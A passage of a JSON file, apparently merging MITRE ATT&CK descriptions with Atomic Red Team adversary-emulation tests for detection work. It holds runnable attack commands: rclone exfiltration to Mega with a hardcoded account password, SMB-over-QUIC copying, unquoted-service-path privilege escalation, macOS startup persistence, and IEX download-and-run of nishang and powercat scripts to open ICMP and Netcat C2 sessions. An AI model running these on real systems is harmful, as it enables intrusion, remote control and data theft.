["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96"], "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ", "atomic_tests": [{"name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)", "auto_generated_guid": "8529ee44-279a-4a19-80bf-b846a40dda58", "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n", "supported_platforms": ["windows"], "input_arguments": {"rclone_path": {"description": "Directory of rclone.exe", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"}, "rclone_config_path": {"description": "Path to rclone's config file (default should be fine)", "type": "path", "default": "$env:appdata"}, "dir_to_copy": {"description": "Directory to copy", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002"}, "mega_user_account": {"description": "Mega user account", "type": "string", "default": "atomictesting@outlook.com"}, "mega_user_password": {"description": "Mega user password", "type": "string", "default": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"}, "remote_share": {"description": "Remote Mega share", "type": "string", "default": "T1567002"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "rclone must exist at (#{rclone_path})\n", "prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n"}], "executor": {"command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n", "cleanup_command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n", "name": "powershell", "elevation_required": false}}]}, "T1570": {"name": "Lateral Tool Transfer", "technique_id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5", "external_id": "T1570", "data_components": ["Network Traffic Flow", "Process Creation", "File Metadata", "Network Traffic Content", "Named Pipe Metadata", "Network Share Access", "Command Execution", "File Creation"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d"], "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).", "atomic_tests": [{"name": "Exfiltration Over SMB over QUIC (New-SmbMapping)", "auto_generated_guid": "d8d13303-159e-4f33-89f4-9f07812d016f", "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n", "supported_platforms": ["windows"], "input_arguments": {"remote_path": {"description": "The UNC path to the share on the file server", "type": "string", "default": "\\\\example.com\\sales"}, "local_file": {"description": "The local file to be transferred", "type": "path", "default": "C:\\path\\to\\file.txt"}}, "executor": {"command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n", "name": "powershell", "elevation_required": true}}, {"name": "Exfiltration Over SMB over QUIC (NET USE)", "auto_generated_guid": "183235ca-8e6c-422c-88c2-3aa28c4825d9", "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n", "supported_platforms": ["windows"], "input_arguments": {"remote_path": {"description": "The UNC path to the share on the file server", "type": "string", "default": "\\\\example.com\\sales"}, "local_file": {"description": "The local file to be transferred", "type": "path", "default": "C:\\path\\to\\file.txt"}}, "executor": {"command": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n", "name": "powershell", "elevation_required": true}}]}, "T1574.009": {"name": "Path Interception by Unquoted Path", "technique_id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b", "external_id": "T1574.009", "data_components": ["File Modification", "Process Creation", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.", "atomic_tests": [{"name": "Execution of program.exe as service with unquoted service path", "auto_generated_guid": "2770dea7-c50f-457b-84c4-c40a47460d9f", "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"service_executable": {"description": "Path of the executable used for the service and as the hijacked program.exe", "type": "path", "default": "PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe"}}, "executor": {"command": "copy \"#{service_executable}\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"#{service_executable}\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n", "cleanup_command": "sc stop \"Example Service\" >nul 2>&1\nsc delete \"Example Service\" >nul 2>&1\ndel \"C:\\Program Files\\windows_service.exe\" >nul 2>&1\ndel \"C:\\program.exe\" >nul 2>&1\ndel \"C:\\Time.log\" >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1037.005": {"name": "Startup Items", "technique_id": "attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f", "external_id": "T1037.005", "data_components": ["File Modification", "File Creation", "Process Creation", "Command Execution"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.", "atomic_tests": [{"name": "Add file to Local Library StartupItems", "auto_generated_guid": "134627c3-75db-410e-bff8-7a920075f198", "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n", "supported_platforms": ["macos"], "executor": {"command": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "cleanup_command": "sudo rm /Library/StartupItems/EvilStartup.plist\n", "name": "sh", "elevation_required": true}}]}, "T1614.001": {"name": "System Language Discovery", "technique_id": "attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19", "external_id": "T1614.001", "data_components": ["Windows Registry Key Access", "OS API Execution", "Process Creation", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelg\u00e4nging May 2018)\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.", "atomic_tests": [{"name": "Discover System Language by Registry Query", "auto_generated_guid": "631d4cf1-42c9-4209-8fe9-6bd4de9421be", "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n", "supported_platforms": ["windows"], "executor": {"command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n", "name": "command_prompt"}}, {"name": "Discover System Language with chcp", "auto_generated_guid": "d91473ca-944e-477a-b484-0e80217cd789", "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n", "supported_platforms": ["windows"], "executor": {"command": "chcp\n", "name": "command_prompt"}}, {"name": "Discover System Language with locale", "auto_generated_guid": "837d609b-845e-4519-90ce-edc3b4b0e138", "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n", "supported_platforms": ["linux"], "executor": {"command": "locale\n", "name": "sh"}}, {"name": "Discover System Language with localectl", "auto_generated_guid": "07ce871a-b3c3-44a3-97fa-a20118fdc7c9", "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n", "supported_platforms": ["linux"], "executor": {"command": "localectl status\n", "name": "sh"}}, {"name": "Discover System Language by locale file", "auto_generated_guid": "5d7057c9-2c8a-4026-91dd-13b5584daa69", "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check the location of the locale configuration file.\n", "prereq_command": "[ -f /etc/locale.conf ] || [ -f /etc/default/locale ] && exit 0 || exit 1\n", "get_prereq_command": "echo \"Test only valid for systems that have locale file\"\n"}], "executor": {"command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n", "name": "sh"}}, {"name": "Discover System Language by Environment Variable Query", "auto_generated_guid": "cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a", "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if printenv command exists on the machine\n", "prereq_command": "[ -x \"$(command -v printenv)\" ] && exit 0 || exit 1\n", "get_prereq_command": "echo \"printenv command does not exist\"\nexit 1\n"}], "executor": {"command": "env | grep LANG\nprintenv LANG\nset | grep LANG\n", "name": "sh"}}]}, "T1095": {"name": "Non-Application Layer Protocol", "technique_id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b", "external_id": "T1095", "data_components": ["Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c"], "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.", "atomic_tests": [{"name": "ICMP C2", "auto_generated_guid": "0268e63c-e244-42db-bef7-72a9e59fc1fc", "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "The IP address of the listening server", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "name": "powershell"}}, {"name": "Netcat C2", "auto_generated_guid": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37", "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "supported_platforms": ["windows"], "input_arguments": {"server_port": {"description": "The port for the C2 connection", "type": "integer", "default": 80}, "ncat_exe": {"description": "The location of ncat.exe", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe"}, "ncat_path": {"description": "The folder path of ncat.exe", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095"}, "server_ip": {"description": "The IP address or domain name of the listening server", "type": "string", "default": "127.0.0.1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ncat.exe must be available at specified location (#{ncat_exe})\n", "prereq_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory -Force -Path \"#{ncat_path}\" | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n"}], "executor": {"command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n", "name": "powershell"}}, {"name": "Powercat C2", "auto_generated_guid": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e", "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "The IP address or domain name of the listening server", "type": "string", "default": "127.0.0.1"}, "server_port": {"description": "The port for the C2 connection", "type": "integer", "default": 80}}, "executor": {"command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n", "name": "powershell"}}]}, "T1012": {"name": "Query Registry", "technique_id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896", "external_id": "T1012", "data_components": ["Windows Registry Key Access", "Command Execution", "OS API Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "atomic_tests": [{"name": "Query Registry", "auto_generated_guid": "8f7578c4-9863-4d83-875c-a565573bbdf0", "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n", "supported_platforms": ["windows"], "executor": {"command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Query Registry with Powershell cmdlets", "auto_generated_guid": "0434d081-bb32-42ce-bcbb-3548e4f2628f", "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n", "supported_platforms": ["windows"], "executor": {"command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n", "name": "powershell", "elevation_required": true}}, {"name": "Enumerate COM Objects in Registry with Powershell", "auto_generated_guid": "0d80d088-a84c-4353-af1a-fc8b439f1564", "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "File to output list of COM objects to", "type": "string", "default": "$env:temp\\T1592.002Test1.txt"}}, "executor": {"command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file #{output_file} -append\nwrite-output $($CLSID)| out-file #{output_file} -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\n$position += 1} catch{}}\n", "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\nremove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue      \n", "name": "powershell"}}]}, "T1030": {"name": "Data Transfer Size Limits", "technique_id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd", "external_id": "T1030", "data_components": ["Network Traffic Flow", "Network Connection Creation"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c"], "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.", "atomic_tests": [{"name": "Data Transfer Size Limits", "auto_generated_guid": "ab936c51-10f4-46ce-9144-e02137b2016a", "description": "Take a file/directory, split it into 5Mb chunks\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_name": {"description": "File name", "type": "path", "default": "T1030_urandom"}, "folder_path": {"description": "Path where the test creates artifacts", "type": "path", "default": "/tmp/T1030"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The file must exist for the test to run.", "prereq_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"}], "executor": {"command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n", "cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n", "name": "sh"}}]}, "T1218.009": {"name": "Regsvcs/Regasm", "technique_id": "attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8", "external_id": "T1218.009", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)", "atomic_tests": [{"name": "Regasm Uninstall Method Call Test", "auto_generated_guid": "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112", "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Location of the payload", "type": "path", "default": "%tmp%\\T1218.009.dll"}, "source_file": {"description": "Location of the CSharp source_file", "type": "path", "default": "PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The CSharp source file must exist on disk at specified location (#{source_file})\n", "prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs\" -OutFile \"#{source_file}\"\n"}], "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library 